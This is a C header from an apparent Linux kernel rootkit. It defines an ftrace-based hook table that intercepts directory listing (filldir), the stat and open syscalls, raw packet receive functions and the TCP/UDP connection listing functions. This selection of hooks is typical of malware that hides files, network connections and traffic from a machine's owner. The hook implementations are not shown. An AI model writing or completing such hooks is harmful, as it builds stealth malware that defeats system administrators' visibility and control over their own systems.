#ifndef HOOKS_H
#define HOOKS_H

#include "hook_functions.h"
#include <linux/ftrace.h>

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

#define SYSCALL_NAME(name) ("__x64_" name)

#define SYS_HOOK(_name, _function, _original)	\
	{					\
		.name = SYSCALL_NAME(_name),	\
		.function = (_function),	\
		.original = (_original),	\
	}

#define HOOK(_name, _function, _original)	\
	{					\
		.name = (_name),	\
		.function = (_function),	\
		.original = (_original),	\
	}

struct ftrace_hook EX_hooks[] = {
	HOOK("filldir64", ex_filldir64, &real_filldir64),
	HOOK("filldir", ex_filldir, &real_filldir),


	// !sys_stat64 sys_lstat64 ??
	SYS_HOOK("sys_stat", ex_sys_stat, &real_sys_stat),
	SYS_HOOK("sys_lstat", ex_sys_lstat, &real_sys_lstat),
	SYS_HOOK("sys_newstat", ex_sys_newstat, &real_sys_newstat),
	SYS_HOOK("sys_newlstat", ex_sys_newlstat, &real_sys_newlstat),
	SYS_HOOK("sys_newfstatat", ex_sys_newfstatat, &real_sys_newfstatat),
	SYS_HOOK("sys_statx", ex_sys_statx, &real_sys_statx),

	SYS_HOOK("sys_open", ex_sys_open, &real_sys_open),
	SYS_HOOK("sys_openat", ex_sys_openat, &real_sys_openat),
	SYS_HOOK("sys_openat2", ex_sys_openat2, &real_sys_openat2),

	// не ставится хук
	// SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),
	HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
	HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
	HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),
	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
};

#endif
